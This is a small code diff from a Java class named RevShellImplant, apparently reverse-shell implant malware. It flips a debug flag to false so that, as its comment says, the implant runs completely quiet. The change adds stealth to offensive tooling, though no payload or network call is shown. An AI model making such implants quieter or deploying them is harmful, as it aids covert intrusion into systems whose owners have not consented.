@@ -65,7 +65,7 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
      * Print debug output to stdout.
      * Setting this to false will make the implant completely quiet.
      */
-    static volatile boolean CONF_DEBUG_OUTPUT = true;
+    static volatile boolean CONF_DEBUG_OUTPUT = false;
 
     @SuppressWarnings("unused")
     public static void init() {
